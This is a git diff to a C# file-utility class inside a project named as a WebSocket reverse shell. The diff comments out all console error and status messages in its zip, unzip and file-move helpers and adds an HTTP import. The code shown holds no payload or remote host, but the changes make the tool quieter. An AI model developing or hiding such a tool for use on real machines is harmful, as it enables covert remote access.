@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
 using System.Linq;
+using System.Net.Http;
 using System.Text;
 using System.Threading.Tasks;
 using WebSocketReverseShellDotNet.model;
@@ -59,7 +60,7 @@ namespace WebSocketReverseShellDotNet.utils
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.ToString());
+               /* Console.WriteLine(e.ToString());*/
                 return string.Empty;
             }
         }
@@ -80,7 +81,7 @@ namespace WebSocketReverseShellDotNet.utils
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Exception occurred in the thread: " + ex);
+               /* Console.WriteLine("Exception occurred in the thread: " + ex);*/
             }
         }
 
@@ -93,7 +94,7 @@ namespace WebSocketReverseShellDotNet.utils
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.ToString());
+                /*Console.WriteLine(ex.ToString());*/
             }
         }
 
@@ -127,12 +128,12 @@ namespace WebSocketReverseShellDotNet.utils
                     throw new IOException("Expected one file in the ZIP archive, found: " + extractedFiles.Length);
                 }
 
-                Console.WriteLine("Unzip completed successfully.");
+                /*Console.WriteLine("Unzip completed successfully.");*/
                 return extractedFiles[0];
             }
             catch (IOException e)
             {
-                Console.Error.WriteLine("Failed to unzip the file: " + zipFilePath);
+                /*Console.Error.WriteLine("Failed to unzip the file: " + zipFilePath);*/
                 throw e; // Rethrow the exception to indicate the failure
             }
         }
@@ -180,13 +181,13 @@ namespace WebSocketReverseShellDotNet.utils
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine(($"Error moving file: {ex.Message}"));
+                    /*Console.WriteLine(($"Error moving file: {ex.Message}"));*/
                     return "";
                 }
             }
             else
             {
-                Console.WriteLine(($"The file '{sourcePath}' does not exist."));
+                /*Console.WriteLine(($"The file '{sourcePath}' does not exist."));*/
                 return  "";
             }
         }
@@ -223,7 +224,7 @@ namespace WebSocketReverseShellDotNet.utils
                         }
                         else
                         {
-                            Console.WriteLine($"File not found: {filePath}");
+                            /*Console.WriteLine($"File not found: {filePath}");*/
                         }
                         if (zipArchive.Entries.Count == 0) return null;
                     }
@@ -236,7 +237,7 @@ namespace WebSocketReverseShellDotNet.utils
             catch (Exception ex)
             {
                 // Handle any exceptions that may occur during zipping
-                Console.WriteLine($"Error zipping files: {ex.Message}");
+               /* Console.WriteLine($"Error zipping files: {ex.Message}");*/
                 return null;
             }
         }
